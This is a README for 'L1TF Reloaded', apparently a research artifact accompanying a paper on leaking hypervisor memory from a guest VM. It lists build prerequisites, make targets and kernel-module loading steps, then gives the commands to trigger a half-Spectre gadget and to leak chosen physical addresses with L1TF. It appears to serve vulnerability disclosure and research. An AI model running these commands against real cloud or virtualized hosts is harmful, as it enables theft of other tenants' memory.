# L1TF Reloaded

## Prerequisites

To run this in an attacker VM, make sure you have the following things setup:

- `CMake`, at least version 3.10.
- `make`
- `gcc`, we used version `gcc (GCC) 14.2.1 20240910`
- Headers for your Linux kernel, compiled with the patch from Figure 6 of the paper.

## Building

To build everything, just run

```sh
make
```

You can also build each target separately, with commands such as

```sh
make kvm_leak
make victim
make hypercall
make kvm_assist
make pteditor.ko
```

To remove all the build artifacts, run

```sh
make clean
```

## Running

Load the required kernel modules with

```sh
make load_modules
```

Then, run the following two commands in separate shells.

To trigger the half-Spectre gadget:

```sh
./build/kvm_leak access_min [index into the phys_map] [amount of bytes you want to leak]
```

To leak the loaded data with L1TF:

```sh
./build/kvm_leak l1tf leak -a [physical address you want to leak] -l [amount of bytes you want to leak]
```

## Licence

This is free software licensed under the European Union Public Licence v.1.2. See [LICENSE](./LICENSE) for more details.
